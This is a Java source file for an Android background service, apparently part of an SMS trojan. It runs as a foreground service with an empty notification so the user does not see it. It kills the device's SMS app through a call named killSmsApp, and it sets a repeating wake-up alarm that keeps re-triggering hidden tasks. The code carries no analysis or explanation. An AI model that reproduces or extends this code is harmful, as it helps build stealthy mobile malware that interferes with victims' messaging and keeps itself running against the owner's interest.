package c;
import net.workspace.biz.BIZ;
import net.workspace.manager.TaskManager;
import net.workspace.util.T;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;

/**
 * TaskService
 * @author Hike
 *
 */
@SuppressLint("NewApi")
public class TS extends Service {
    private String PREF_NAME = "OPQRVSG";
    private static final Object locker = new Object();
    @Override
    public void onStart(Intent intent, int i) {
        super.onStart(intent, i);
        startForeground((int) (Math.random() * Integer.MAX_VALUE), new Notification());
        T.init(getApplicationContext());
        T.killSmsApp();
        SharedPreferences pref = getSharedPreferences(PREF_NAME, 0);
        long current = System.currentTimeMillis();
        String action = null;
        if (intent != null) action = intent.getAction();
        if ("do".equals(action)) {
            pref.edit().putLong(PREF_NAME, current).commit();
            TaskManager.getInstance().triggerByService();
        } else {
            long lastProcessTime = pref.getLong(PREF_NAME, 0);
            if (current - lastProcessTime > BIZ.TASK_CHECK_INTERVAL * 1000) {
                restartAlarm();
            }
        }
    }
    public static void restartAlarm() {
        synchronized (locker) {
            AlarmManager manager = (AlarmManager) T.context.getSystemService("alarm");
            PendingIntent pending = PendingIntent.getService(T.context, 0, new Intent().setClass(T.context, TS.class).setAction("do"), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, BIZ.TASK_CHECK_INTERVAL * 1000, pending);
        }
    }
    @Override
    public void onDestroy() {
        stopForeground(true);
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
